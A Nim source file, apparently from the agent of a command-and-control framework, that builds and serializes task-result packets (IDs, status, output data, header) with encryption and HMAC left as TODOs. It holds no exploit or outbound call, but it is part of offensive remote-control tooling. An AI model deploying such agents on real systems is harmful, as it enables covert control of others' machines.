import times 
import ../../../common/[types, serialize, utils]

proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, resultData: seq[byte]): TaskResult = 

    return TaskResult(
        header: Header(
            magic: MAGIC,
            version: VERSION, 
            packetType: cast[uint8](MSG_RESPONSE),
            flags: cast[uint16](FLAG_PLAINTEXT),
            seqNr: 1'u32, # TODO: Implement sequence tracking
            size: 0'u32,
            hmac: default(array[16, byte])
        ), 
        taskId: task.taskId,
        agentId: task.agentId,
        listenerId: task.listenerId,
        timestamp: uint32(now().toTime().toUnix()),
        command: task.command,
        status: cast[uint8](status),
        resultType: cast[uint8](resultType),
        length: uint32(resultData.len),
        data: resultData,
    )

proc serializeTaskResult*(taskResult: TaskResult): seq[byte] = 
    
    var packer = initPacker()

    # Serialize result body
    packer 
        .add(taskResult.taskId)
        .add(taskResult.agentId)
        .add(taskResult.listenerId)
        .add(taskResult.timestamp)
        .add(taskResult.command)
        .add(taskResult.status)
        .add(taskResult.resultType)
        .add(taskResult.length)

    if cast[ResultType](taskResult.resultType) != RESULT_NO_OUTPUT:
        packer.addData(taskResult.data)

    let body = packer.pack()
    packer.reset()

    # TODO: Encrypt result body 

    # Serialize header 
    let header = packer.packHeader(taskResult.header, uint32(body.len))

    # TODO: Calculate and patch HMAC

    return header & body 